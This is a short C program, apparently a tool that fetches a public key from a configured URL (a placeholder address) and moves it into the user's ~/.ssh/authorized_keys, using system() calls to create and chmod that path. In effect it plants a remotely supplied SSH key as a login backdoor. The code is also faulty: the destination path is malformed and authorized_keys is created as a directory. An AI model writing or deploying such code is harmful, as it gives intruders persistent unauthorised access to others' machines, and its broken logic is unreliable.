#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include "net_functions.h"

struct config {
	char * destination;
	char * source_and_outfile;
	char * url;
};

// FILE MOVING

int MoveFile(const char * src, const char * dest) {
	printf("moving %s to %s\n", src, dest);
	
	rename(src, dest);
	return 0;
}

int main(void) {
	struct stat st = { 0 };
	struct config config_1;

	// CONFIG

	config_1.url = "http://0.0.0.0/key.pub";
	config_1.source_and_outfile = "/tmp/key.pub";
	config_1.destination = "/~/.ssh/authorized_keys/";

	// END CONFIG 

	char * mode = "600";
	char * buf = config_1.destination;

	int i;
	i = strtol(mode, 0, 8);

	if (stat(config_1.destination, &st) == -1) {
			printf("creating directory %s\n", config_1.destination);

			system("mkdir ~/.ssh/authorized_keys");	// shell scripting ;(
			system("chmod 600 ~/.ssh/authorized_keys");
	} 

	printf("downlading %s from %s\n\n", config_1.source_and_outfile, config_1.url);

	DownloadFiles(config_1.url, config_1.source_and_outfile);
	MoveFile(config_1.source_and_outfile, config_1.destination);
	
	return 0;
}
